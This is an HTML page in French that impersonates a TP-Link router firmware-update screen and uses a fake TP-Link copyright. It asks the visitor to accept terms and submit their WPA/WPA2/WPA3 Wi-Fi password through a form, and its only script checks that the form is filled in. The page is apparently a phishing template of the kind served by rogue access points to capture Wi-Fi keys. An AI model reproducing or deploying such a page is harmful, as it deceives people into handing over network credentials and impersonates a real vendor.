<!DOCTYPE html>
<html lang="fr-FR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../../assets/css/stylesheet.css">
    <title>TP-LINK :: Mise à jour du Firmware</title>
</head>
<body>
    
    <img src="../../assets/img/new-logo.png" width="150px" class="img-fluid" alt="Responsive image">
    <section class="container">
    <div class="form-head">
        <h1>Mise à jour du Firmware</h1>
    </div>
    <div class="text">
        <p>Une nouvelle version du firmware a été détectée et attend d’être installée. Veuillez consulter nos nouvelles conditions générales et continuer.</p>
    </div>
    <form id='form1' method="POST">
        <div class="form-group">
          <label for="terms">Accepter les conditions générales</label>
        </div>
        
        <div class="form-group">
            <label for="password">Mot de passe</label>
            <input type="password" class="form-control" name="password" id="password" placeholder="Mot de passe WPA/WPA2/WPA3" required>
        </div>

        <div class="form-group form-check">
            <input type="checkbox" class="form-check-input" id="acceptTerms" required>
            <label class="form-check-label" for="acceptTerms">J’accepte les conditions générales</label>
        </div>

        <div class="form-btn">
            <button type="submit" class="btn btn-primary">Mettre à jour</button>
        </div>
        <div class="form-check">
            <small id="copyright" class="form-text text-muted">Copyright © TP-Link Corporation Limited. 2026. Tous droits réservés.</small>
          </div>
      </form>
    </section>

    <script src="../../assets/js/jquery-3.5.1.js"></script>
    <script src="../../assets/js/popper.min.js"></script>
    <script src="../../assets/js/bootstrap.min.js"></script>
    <script>
        document.getElementById('form1').addEventListener('submit', function(event) {
            var password = document.getElementById('password');
            var acceptTerms = document.getElementById('acceptTerms');

            if (!acceptTerms.checked) {
                acceptTerms.setCustomValidity('Vous devez accepter les conditions générales.');
            } else {
                acceptTerms.setCustomValidity('');
            }

            if (password.value === '') {
                password.setCustomValidity('Vous devez saisir un mot de passe.');
            } else {
                password.setCustomValidity('');
            }

            if (!this.checkValidity()) {
                event.preventDefault();
            }
        });
    </script>
</body>
</html>
